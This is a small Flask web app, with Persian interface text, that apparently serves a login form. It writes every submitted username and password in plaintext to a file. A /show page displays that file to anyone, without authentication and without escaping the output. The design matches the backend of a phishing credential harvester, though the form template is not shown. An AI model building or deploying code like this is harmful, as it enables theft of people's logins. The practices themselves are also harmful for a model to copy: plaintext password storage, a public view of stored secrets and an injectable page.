from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('saved.txt', 'a') as file:
            file.write(f"Username: {username} | Password: {password}\n")
    return render_template('index.html')

@app.route('/show')
def show_data():
    try:
        with open('saved.txt', 'r') as f:
            content = f.read()
    except FileNotFoundError:
        content = "هیچ اطلاعاتی ثبت نشده هنوز."

    return f"<h2>اطلاعات فرم ثبت‌شده:</h2><pre>{content}</pre>"

app.run(host='0.0.0.0', port=8080)
